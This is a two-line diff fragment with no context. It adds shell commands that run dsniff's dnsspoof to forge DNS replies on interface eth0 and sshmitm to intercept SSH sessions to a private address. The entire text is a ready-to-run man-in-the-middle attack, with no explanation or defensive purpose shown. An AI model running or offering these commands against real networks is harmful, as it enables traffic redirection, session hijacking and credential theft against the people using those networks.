@@ -1,0 +1,2 @@
+dnsspoof -i eth0 -f /etc/dsniff/dnsspoof.hosts 
+sshmitm -I -p 23 192.168.88.144 22
